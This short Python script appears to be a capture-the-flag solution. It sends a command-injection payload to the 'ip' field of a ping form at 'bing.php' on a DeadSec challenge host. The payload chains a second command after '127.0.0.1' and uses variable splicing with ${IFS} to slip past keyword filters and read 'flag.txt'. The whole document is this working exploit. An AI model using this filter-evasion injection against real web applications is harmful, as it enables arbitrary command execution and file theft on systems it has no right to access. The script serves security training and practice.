import requests

url = "https://0e1daf54ef36aeb630b9ce54.deadsec.quest/bing.php"

payload = "127.0.0.1;a=ca;b=t;c=fl;d=ag.txt;$a$b${IFS}///$c$d"

data = {
    "ip": payload,
    "Submit": "1"
}

response = requests.post(url, data=data)
print(response.text)
